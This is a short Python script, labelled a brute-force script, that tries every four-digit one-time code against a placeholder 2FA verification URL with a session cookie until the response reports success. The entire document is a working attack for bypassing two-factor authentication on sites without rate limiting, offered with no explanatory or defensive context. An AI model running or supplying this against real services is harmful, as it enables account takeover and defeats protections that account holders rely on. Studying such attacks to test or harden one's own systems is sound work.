# Brute force script
import requests

url = "http://target.com/verify-2fa"
cookies = {"session": "valid_session"}

for code in range(10000):
    otp = str(code).zfill(4)
    data = {"otp": otp}
    r = requests.post(url, data=data, cookies=cookies)
    if "success" in r.text.lower():
        print(f"Valid code: {otp}")
        break
